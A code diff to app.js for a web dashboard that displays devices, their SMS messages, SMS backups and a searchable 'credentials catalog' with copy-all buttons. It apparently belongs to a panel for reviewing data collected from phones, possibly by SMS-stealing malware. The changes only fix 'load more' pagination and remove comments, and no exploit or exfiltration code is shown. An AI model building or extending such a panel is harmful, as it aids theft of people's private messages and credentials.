@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - COMPLETE WITH ALL FEATURES                        */
+/* app.js - COMPLETE WITH FIXED LOAD MORE                      */
 /* ============================================================ */
 
 // ============================================================
@@ -71,7 +71,6 @@ const $ = (id) => document.getElementById(id);
 // FAVOURITES - STATE & FUNCTIONS
 // ============================================================
 
-// Load favourites from localStorage
 function loadFavourites() {
     try {
         const saved = localStorage.getItem('rtoFavourites');
@@ -87,7 +86,6 @@ function loadFavourites() {
     return state.favourites;
 }
 
-// Save favourites to localStorage
 function saveFavourites() {
     try {
         localStorage.setItem('rtoFavourites', JSON.stringify(state.favourites));
@@ -97,7 +95,6 @@ function saveFavourites() {
     updateFavCounts();
 }
 
-// Toggle favourite status
 function toggleFavourite(devId) {
     const index = state.favourites.indexOf(devId);
     if (index > -1) {
@@ -112,12 +109,10 @@ function toggleFavourite(devId) {
     updateDeviceFavStars();
 }
 
-// Check if device is favourite
 function isFavourite(devId) {
     return state.favourites.includes(devId);
 }
 
-// Update favourite counts in UI
 function updateFavCounts() {
     const count = state.favourites.length;
     const favCount = $('favCount');
@@ -132,7 +127,6 @@ function updateFavCounts() {
     }
 }
 
-// Clear all favourites
 function clearAllFavourites() {
     if (!confirm('⚠️ Remove all devices from favourites?')) return;
     state.favourites = [];
@@ -606,7 +600,7 @@ function renderDevicesOptimized() {
 }
 
 // ============================================================
-// BUILD DEVICE CARD - PREMIUM WITH LATEST FIRST & FAVOURITES
+// BUILD DEVICE CARD - PREMIUM
 // ============================================================
 function buildDeviceCardPremium(devId, index, devices) {
     const dev = devices[devId] || {};
@@ -1219,7 +1213,7 @@ function renderSmsCards(list, showDevice = false) {
 }
 
 // ============================================================
-// RENDER ALL SMS
+// RENDER ALL SMS - FIXED LOAD MORE
 // ============================================================
 function renderAllSmsOptimized() {
     const container = $('allSmsContainer');
@@ -1263,7 +1257,11 @@ function renderAllSmsOptimized() {
             ? 'No messages for ' + escapeHtml(state.smsFilterDevice) 
             : 'No messages found';
         container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox empty-icon"></i>${msg}</div>`;
-        if (loadMore) loadMore.style.display = 'none';
+        if (loadMore) {
+            loadMore.style.display = 'none';
+            const newLoadMore = loadMore.cloneNode(true);
+            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
+        }
         return;
     }
     
@@ -1278,40 +1276,56 @@ function renderAllSmsOptimized() {
         container.innerHTML += newHtml;
     }
     
-    if (loadMore) {
+    // FIXED: Proper Load More button handling
+    const loadMoreBtn = document.getElementById('allSmsLoadMore');
+    if (loadMoreBtn) {
         if (end < state.allSmsList.length) {
-            loadMore.style.display = 'block';
-            loadMore.innerHTML = `📥 Load More (${state.allSmsList.length - end} remaining)`;
-            const newLoadMore = loadMore.cloneNode(true);
-            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
+            loadMoreBtn.style.display = 'block';
+            loadMoreBtn.innerHTML = `📥 Load More (${state.allSmsList.length - end} remaining)`;
+            
+            // Remove old event listeners
+            const newLoadMore = loadMoreBtn.cloneNode(true);
+            loadMoreBtn.parentNode.replaceChild(newLoadMore, loadMoreBtn);
+            
+            // Add new click handler
+            newLoadMore.addEventListener('click', function() {
+                loadMoreAllSms();
+            });
             newLoadMore.onclick = function() {
-                state.allSmsOffset += SMS_LIMIT;
-                renderAllSmsOptimized();
+                loadMoreAllSms();
             };
         } else {
-            loadMore.style.display = 'none';
+            loadMoreBtn.style.display = 'none';
+            const newLoadMore = loadMoreBtn.cloneNode(true);
+            loadMoreBtn.parentNode.replaceChild(newLoadMore, loadMoreBtn);
         }
     }
 }
 
 // ============================================================
-// LOAD MORE ALL SMS
+// LOAD MORE ALL SMS - FIXED
 // ============================================================
 function loadMoreAllSms() {
     const total = state.allSmsList.length;
     const currentOffset = state.allSmsOffset;
+    
     if (currentOffset + SMS_LIMIT < total) {
         state.allSmsOffset += SMS_LIMIT;
         renderAllSmsOptimized();
+        showToast(`📥 Loaded more messages (${Math.min(currentOffset + SMS_LIMIT, total)}/${total})`, 'info', 1500);
     } else {
         showToast('📭 No more messages to load', 'info');
         const loadMore = $('allSmsLoadMore');
-        if (loadMore) loadMore.style.display = 'none';
+        if (loadMore) {
+            loadMore.style.display = 'none';
+            const newLoadMore = loadMore.cloneNode(true);
+            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
+        }
     }
 }
 
 // ============================================================
-// FILTER SMS BY DEVICE
+// FILTER SMS BY DEVICE - FIXED
 // ============================================================
 function filterSmsByDevice(deviceId) {
     state.smsFilterDevice = deviceId;
@@ -1319,6 +1333,7 @@ function filterSmsByDevice(deviceId) {
     if (clearBtn) clearBtn.style.display = 'inline-block';
     state.allSmsOffset = 0;
     showToast(`📱 Filtering: ${deviceId}`, 'info');
+    
     if (!state.isPanelOpen.sms) {
         togglePanel('sms');
     } else {
@@ -1407,7 +1422,7 @@ function renderBackupPanel() {
 }
 
 // ============================================================
-// BACKUP FUNCTIONS - LATEST FIRST WITH BACKUP TAG
+// BACKUP FUNCTIONS
 // ============================================================
 function updateBackupStatusDisplay(devId) {
     const dev = state.data.user_data?.[devId];
@@ -1589,7 +1604,7 @@ function clearBackupStatus() {
 }
 
 // ============================================================
-// LOAD BACKUP SMS FOR DEVICE - LATEST FIRST
+// LOAD BACKUP SMS FOR DEVICE
 // ============================================================
 function loadBackupSmsForDevice(devId) {
     const container = $('backupSmsList');
@@ -1619,9 +1634,6 @@ function loadBackupSmsForDevice(devId) {
     });
 }
 
-// ============================================================
-// RENDER BACKUP SMS LIST - LATEST FIRST WITH BACKUP TAG
-// ============================================================
 function renderBackupSmsList(container, data, devId) {
     if (!container) return;
     const messages = [];
@@ -1756,7 +1768,7 @@ function closeBackupSmsModal(e) {
 }
 
 // ============================================================
-// SMS MODAL
+// SMS MODAL - FIXED LOAD MORE
 // ============================================================
 function openSmsModal(target) {
     state.modalTarget = target;
@@ -1808,16 +1820,39 @@ function renderModalSms() {
     if (loadMore) {
         if (end < state.modalSmsList.length) {
             loadMore.style.display = 'block';
-            loadMore.textContent = `📥 Load More (${state.modalSmsList.length - end} remaining)`;
+            loadMore.innerHTML = `📥 Load More (${state.modalSmsList.length - end} remaining)`;
+            const newLoadMore = loadMore.cloneNode(true);
+            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
+            newLoadMore.onclick = function() {
+                loadMoreModalSms();
+            };
+            newLoadMore.addEventListener('click', function() {
+                loadMoreModalSms();
+            });
         } else {
             loadMore.style.display = 'none';
+            const newLoadMore = loadMore.cloneNode(true);
+            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
         }
     }
 }
 
 function loadMoreModalSms() {
-    state.modalSmsOffset += SMS_LIMIT;
-    renderModalSms();
+    const total = state.modalSmsList.length;
+    const currentOffset = state.modalSmsOffset;
+    
+    if (currentOffset + SMS_LIMIT < total) {
+        state.modalSmsOffset += SMS_LIMIT;
+        renderModalSms();
+    } else {
+        showToast('📭 No more messages to load', 'info');
+        const loadMore = $('modalLoadMore');
+        if (loadMore) {
+            loadMore.style.display = 'none';
+            const newLoadMore = loadMore.cloneNode(true);
+            loadMore.parentNode.replaceChild(newLoadMore, loadMore);
+        }
+    }
 }
 
 function closeSmsModal(e) {
@@ -2090,7 +2125,7 @@ function escapeHtml(text) {
 }
 
 // ============================================================
-// CREDENTIALS CATALOG - LATEST SUBMISSION FIRST
+// CREDENTIALS CATALOG
 // ============================================================
 function renderCredentialsCatalog() {
     const grid = document.getElementById('credsGrid');
@@ -2168,9 +2203,6 @@ function renderCredentialsCatalog() {
     renderCredPagination(pagination, totalPages, filteredData.length);
 }
 
-// ============================================================
-// BUILD CREDENTIAL CARD - LATEST FIRST WITH BADGE
-// ============================================================
 function buildCredCard(item) {
     const deviceName = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
     const serial = item.serial || 0;
@@ -2251,9 +2283,6 @@ function buildCredCard(item) {
     `;
 }
 
-// ============================================================
-// BUILD CREDENTIAL DEVICE TABS
-// ============================================================
 function buildCredDeviceTabs(container) {
     if (!container) return;
     
@@ -2289,9 +2318,6 @@ function buildCredDeviceTabs(container) {
     container.innerHTML = html;
 }
 
-// ============================================================
-// APPLY CREDENTIAL FILTERS
-// ============================================================
 function applyCredFilters(data) {
     let filtered = [...data];
     
@@ -2324,9 +2350,6 @@ function applyCredFilters(data) {
     return filtered;
 }
 
-// ============================================================
-// CREDENTIAL FILTER FUNCTIONS
-// ============================================================
 function filterCreds(filter) {
     state.credFilter = filter;
     state.credCurrentPage = 1;
@@ -2356,9 +2379,6 @@ function filterCredsByDevice(deviceId) {
     renderCredentialsCatalog();
 }
 
-// ============================================================
-// CREDENTIAL SEARCH
-// ============================================================
 let credSearchTimeout = null;
 
 function searchCredentials(query) {
@@ -2373,9 +2393,6 @@ function searchCredentials(query) {
     }, 300);
 }
 
-// ============================================================
-// CREDENTIAL PAGINATION
-// ============================================================
 function renderCredPagination(container, totalPages, totalItems) {
     if (!container) return;
     if (totalPages <= 1) { container.innerHTML = ''; return; }
@@ -2421,9 +2438,6 @@ function credGoToPage(page) {
     renderCredentialsCatalog();
 }
 
-// ============================================================
-// CREDENTIAL UTILITY FUNCTIONS
-// ============================================================
 function copyAllCreds(deviceId, index) {
     const data = state.credCatalogData.find(d => d.deviceId === deviceId);
     if (!data || !data.credentials[index]) return;
@@ -2756,7 +2770,6 @@ function initLongPress() {
 // DOM CONTENT LOADED
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    // Load favourites
     loadFavourites();
     
     const backupSelect = $('backupDeviceSelect');
